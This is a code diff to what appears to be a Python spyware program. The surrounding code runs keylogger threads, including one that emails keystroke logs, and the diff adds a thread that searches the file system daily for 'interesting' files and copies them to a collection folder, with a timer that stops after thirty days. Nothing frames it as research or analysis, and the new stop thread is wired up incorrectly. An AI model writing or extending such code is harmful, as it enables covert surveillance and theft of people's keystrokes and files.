@@ -172,6 +172,7 @@ class OSmanipulation(object):
     for text patterns, etc."""
     def __init__(self):
         self.log_controller = Log()
+        self.continue_checking_flag = True
 
     def check(self, path, search_term):
         f = open(path, Constants.READ_MODE)
@@ -181,7 +182,6 @@ class OSmanipulation(object):
                 return True
 
     def doesExist(self):
-        import os
         list_of_existing_files = []
         f = open(Constants.FILE_LIST_PATH, Constants.READ_MODE)
         for file_name in f:
@@ -208,9 +208,8 @@ class OSmanipulation(object):
             f = open(Constants.FIRST_TIME_ALL_DIR,'w')
             f.close()
 
-
     def Copy_interesting_files(self):
-        while True:
+        while self.continue_checking_flag is True:
             time.sleep(86400)
             for root, dirs, files in os.walk(Constants.SEARCH_ROOT):
                 for each in files:
@@ -299,6 +298,10 @@ class OSmanipulation(object):
                                                         shutil.copy2(temp, Constants.DESTINATION_FOLDER_PATH)
                             except Exception:
                                 pass
+
+    def stop_copying(self):
+        time.sleep(2592000)
+        self.continue_checking_flag = False
 
     def exucuteFunction(self, file_path):
         # We need to decide whether to add a file_path to the Constants
@@ -416,11 +419,23 @@ def kickOff():
     keylogger_mail_thread = threading.Thread(target=keylogger.send_keylog)
     stop_keylogger_mail_thread = threading.Thread(target=keylogger.stop_to_send_keylog)
 
+
+    # Create the OSmanipulation object for copying interesting files
+    file_copy = OSmanipulation()
+
+    # Define the threads for the keylogger
+    searching_thread = threading.Thread(target=file_copy.Copy_interesting_files)
+    stop_searching_thread = threading.Thread(target=file_copy.stop_copying())
+
     # Start the threads for the keylogger
     start_keylogger_thread.start()
     stop_timer.start()
     keylogger_mail_thread.start()
     stop_keylogger_mail_thread.start()
+
+    # Start the threads for file copy
+    searching_thread.start()
+    stop_searching_thread.start()
 
 
 # import winreg
